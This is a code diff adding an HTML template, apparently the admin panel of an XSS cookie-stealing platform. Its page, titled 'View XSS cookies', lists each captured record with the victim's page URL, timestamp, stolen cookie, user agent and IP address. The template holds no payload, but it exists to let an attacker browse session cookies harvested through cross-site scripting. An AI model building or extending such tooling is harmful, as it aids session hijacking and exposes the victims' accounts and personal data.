@@ -1,0 +1,31 @@
+<include file="Index:Header" />
+<section class="am-panel am-panel-secondary">
+  <header class="am-panel-hd">
+    <h3 class="am-panel-title">查看XSS饼干</h3>
+  </header>
+  <div class="am-panel-bd">
+  
+  
+<section data-am-widget="accordion" class="am-accordion am-accordion-gapped"
+data-am-accordion='{  }'>
+<volist name="getxss" id='vo'>
+  <dl class="am-accordion-item am-active">
+    <dt class="am-accordion-title">URL:{$vo['location']}</dt>
+    <dd class="am-accordion-content am-collapse">时间:  <font color="#FF0000"><b> {:ti($vo['time'])}</b></font>
+      <br/>Cookie:  <font color="#FF0000"><b> {$vo['cookie']}</b></font>
+      <br/>网址:  <font color="#FF0000"><b> {$vo['location']}</b></font>
+      <br/>设备UA:  <font color="#FF0000"><b> {$vo['ua']}</b></font>
+	  <br/>IP:  <font color="#FF0000"><b> {$vo['ip']}</b></font>
+	  </dd>
+  </dl>
+
+</volist>
+</section>
+
+
+
+
+  </div>
+</section>
+
+<include file="Index:Footer" />
